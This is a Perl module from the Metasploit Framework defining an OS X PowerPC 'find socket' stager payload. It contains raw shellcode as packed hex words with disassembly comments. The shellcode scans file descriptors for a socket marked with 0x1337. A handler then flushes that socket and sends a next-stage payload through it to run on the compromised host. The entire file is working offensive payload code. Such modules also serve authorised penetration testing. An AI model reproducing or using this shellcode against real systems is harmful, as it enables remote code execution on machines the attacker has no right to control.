package Msf::PayloadComponent::OSXFindStagerPeek;
use strict;
use base 'Msf::PayloadComponent::OSXPayload';
sub _Load {
  Msf::PayloadComponent::OSXPayload->_Import('Msf::PayloadComponent::FindConnection');
  __PACKAGE__->SUPER::_Load();
}

my $info =
{
    'Authors'      => [ 'H D Moore <hdm [at] metasploit.com>', ],
    'Arch'         => [ 'ppc' ],
    'Priv'         => 0,
    'OS'           => [ 'osx' ],
    'Multistage'   => 1,      
    'Size'         => '',
    'OSXPayload' =>
    {   
        Offsets => { },   
        Payload =>
		pack('N*',
			 0x3ba00fff,     # 0x1dbc <main>:          li      r29,4095
			 0x7fa903a6,     # 0x1dc0 <main+4>:        mtctr   r29
			 0x381df067,     # 0x1dc4 <findsock>:      addi    r0,r29,-3993
			 0x7c6902a6,     # 0x1dc8 <findsock+4>:    mfctr   r3
			 0x3881eff8,     # 0x1dcc <findsock+8>:    addi    r4,r1,-4104
			 0x38a00fff,     # 0x1dd0 <findsock+12>:   li      r5,4095
             0x38ddf003,     # 0x1dd4 <findsock+16>:   addi    r6,r29,-4093
			 0x44ffff02,     # 0x1dd8 <findsock+20>:   sc
			 0x7cc63279,     # 0x1ddc <findsock+24>:   xor.    r6,r6,r6
			 0x7fc902a6,     # 0x1de0 <findsock+28>:   mfctr   r30
			 0xa381eff8,     # 0x1de4 <findsock+32>:   lhz     r28,-4104(r1)
			 0x2c1c1337,     # 0x1de8 <findsock+36>:   cmpwi   r28, 0x1337
			 0x4002ffd8,     # 0x1dec <findsock+40>:   bdnzf+  eq,0x1dc4 <findsock>
			 0x3881effc,     # 0x1df0 <gotsock>:       addi    r4,r1,-4100
			 0x7c8903a6,     # 0x1df4 <gotsock+4>:     mtctr   r4
			 0x4c810420,     # 0x1df8 <gotsock+8>:     blectr
			 0x7cc63279,     # 0x1dfc <gotsock+12>:    xor.    r6,r6,r6
		),
    },
};

sub new {
    my $class = shift;
    my $hash = @_ ? shift : { };
    $hash = $class->MergeHashRec($hash, {'Info' => $info});
    my $self = $class->SUPER::new($hash, @_);
    return($self);
}

sub ChildHandler {
    my $self = shift;
    my $sock = shift;
    my $payload = $self->BuildOSX($self->OSXStagePayload);
	
    # flush the recv queue prior to executing the next stage
	my $flush_recv = pack('N*', 
		0x38000066,     # 0x1de8 <main>:          li      r0,102
		0x7fc3f378,     # 0x1dec <main+4>:        mr      r3,r30
		0x3881e002,     # 0x1df0 <main+8>:        addi    r4,r1,-8190
		0x38a00fff,     # 0x1df4 <main+12>:       li      r5,4095
		0x7cc63278,     # 0x1df8 <main+16>:       xor     r6,r6,r6
		0x44ffff02,     # 0x1dfc <main+20>:       .long 0x44ffff02
		0x7cc63279,     # 0x1e00 <main+24>:       xor.    r6,r6,r6
	);
	
    my $data = pack('N', 0x1337beef) . $flush_recv . $payload;
	
    eval { $sock->send($data); };
    return $self->SUPER::ChildHandler($sock);
}

1;

